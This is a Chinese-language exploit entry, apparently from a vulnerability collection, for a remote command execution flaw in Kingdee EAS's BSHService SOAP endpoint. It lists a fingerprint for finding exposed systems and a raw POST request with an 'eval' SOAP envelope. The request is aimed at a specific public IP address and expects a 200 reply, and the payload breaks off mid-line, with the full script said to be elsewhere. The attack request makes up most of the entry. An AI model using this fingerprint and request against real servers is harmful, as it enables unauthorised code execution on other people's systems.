# 金蝶EASBSHService存在远程代码执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="getCookie(\"`

**请求体 / payload**
```
**POST** /ormrpc/services/BSHService **HTTP/1.1**
**Host**: 61.190.20.50
**User-Agent**: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/456 Safari/537.36
**Content-Type**: text/xml;charset=UTF-8
SOAPAction:
**<?xml version**=**"1.0"**** encoding**=**"UTF-8"**?**>**
**<soapenv:Envelope xmlns:soapenv**=**"http://schemas.xmlsoap.org/soap/envelope/"**
**                  xmlns:xsd**=**"http://www.w3.org/2001/XMLSchema"**
**                  xmlns:xsi**=**"http://www.w3.org/2001/XMLSchema-instance">**
**  <soapenv:Body>**
**    <eval xmlns**=**"http://tempur…（脚本共 1163 字，完整版见原文）
```
- **预期**：200　|　—